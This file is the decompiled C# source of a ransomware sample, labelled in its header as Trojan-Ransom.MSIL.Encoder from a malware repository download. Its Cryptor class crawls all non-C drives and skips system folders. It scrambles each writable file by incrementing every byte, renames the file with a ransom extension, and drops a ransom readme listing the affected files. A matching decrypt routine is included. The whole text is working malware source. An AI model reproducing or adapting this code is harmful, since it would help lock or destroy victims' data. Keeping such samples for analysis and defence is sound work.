// Decompiled with JetBrains decompiler
// Type: TimeTime.Cryptor
// Assembly: TimeTime, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 1F007389-8A03-4D6F-9F6B-F4F098F481CA
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\HEUR-Trojan-Ransom.MSIL.Encoder.gen-dd9c4e1b9736aca37d120ed38a172a611d9865352e7a1b13bc61ca0c8e0b4d72.exe

using System;
using System.Collections.Generic;
using System.IO;

namespace TimeTime
{
  public class Cryptor
  {
    public static List<string> encr_files = new List<string>();

    public static void DropReadme(string path)
    {
      Settings.readmeText = Settings.readmeText.Replace("<filescount>", Cryptor.encr_files.Count.ToString() ?? "");
      string newValue = "";
      foreach (string encrFile in Cryptor.encr_files)
        newValue = newValue + encrFile + "\r\n";
      Settings.readmeText = Settings.readmeText.Replace("<files>", newValue);
      try
      {
        string path1 = Path.GetDirectoryName(path) + "\\" + Settings.readme_file_name;
        if (File.Exists(path1))
          return;
        File.WriteAllText(path1, Settings.readmeText);
      }
      catch (Exception ex)
      {
      }
    }

    public static void RenameAll()
    {
      foreach (string encrFile in Cryptor.encr_files)
      {
        if (File.Exists(encrFile))
        {
          try
          {
            File.Move(encrFile, encrFile + Settings.ext);
          }
          catch (Exception ex)
          {
          }
        }
      }
    }

    public static void EncryptFile(string file)
    {
      if (file.EndsWith(Settings.readme_file_name) || file.EndsWith(Settings.decryptor_file_name))
        return;
      byte[] numArray = File.ReadAllBytes(file);
      byte[] bytes = new byte[numArray.Length];
      for (int index = 0; index < bytes.Length; ++index)
      {
        byte num = (byte) (char) ((uint) (char) numArray[index] + 1U);
        bytes[index] = num;
      }
      File.WriteAllBytes(file, bytes);
      File.Move(file, file + Settings.ext);
      Cryptor.DropReadme(file);
      FileManager.AddFile(file);
      Cryptor.encr_files.Add(file);
    }

    public static void EncryptDisks()
    {
      foreach (DriveInfo drive in DriveInfo.GetDrives())
      {
        try
        {
          if (drive.IsReady && !drive.Name.Contains("C"))
            Cryptor.TryEncryptFolder(drive.Name);
        }
        catch (Exception ex)
        {
        }
      }
    }

    private static List<string> DirSearch(string sDir)
    {
      List<string> stringList = new List<string>();
      try
      {
        if (sDir.Contains("AppData\\") || sDir.Contains("Windows\\") || sDir.Contains("Common Files\\") || sDir.Contains("WindowsPowerShell\\") || sDir.Contains("Microsoft\\Provisioning\\") || sDir.Contains("ProgramData") || sDir.Contains("Program Files") || sDir.Contains("Cache") || sDir.Contains("$"))
          return stringList;
        foreach (string file in Directory.GetFiles(sDir))
          stringList.Add(file);
        foreach (string directory in Directory.GetDirectories(sDir))
          stringList.AddRange((IEnumerable<string>) Cryptor.DirSearch(directory));
      }
      catch (Exception ex)
      {
      }
      return stringList;
    }

    public static void TryEncryptFolder(string folder)
    {
      try
      {
        Cryptor.EncryptFolder(folder);
      }
      catch (Exception ex)
      {
      }
    }

    public static void EncryptFolder(string folder)
    {
      foreach (string str in Cryptor.DirSearch(folder))
      {
        try
        {
          if (!str.EndsWith(Settings.ext))
          {
            bool flag1 = false;
            bool flag2 = false;
            bool flag3 = new FileInfo(str).Attributes.HasFlag((Enum) FileAttributes.ReadOnly);
            using (FileStream fileStream = new FileStream(str, FileMode.Open))
            {
              flag2 = fileStream.CanRead;
              flag1 = fileStream.CanWrite;
            }
            if (!flag3 & flag1 & flag2)
              Cryptor.EncryptFile(str);
          }
        }
        catch (Exception ex)
        {
        }
      }
    }

    public static void DecryptFile(string file)
    {
      byte[] numArray = File.ReadAllBytes(file);
      byte[] bytes = new byte[numArray.Length];
      for (int index = 0; index < bytes.Length; ++index)
      {
        byte num = (byte) (char) ((uint) (char) numArray[index] - 1U);
        bytes[index] = num;
      }
      File.WriteAllBytes(file, bytes);
      File.Move(file, file.Substring(0, file.Length - Settings.ext.Length));
    }
  }
}
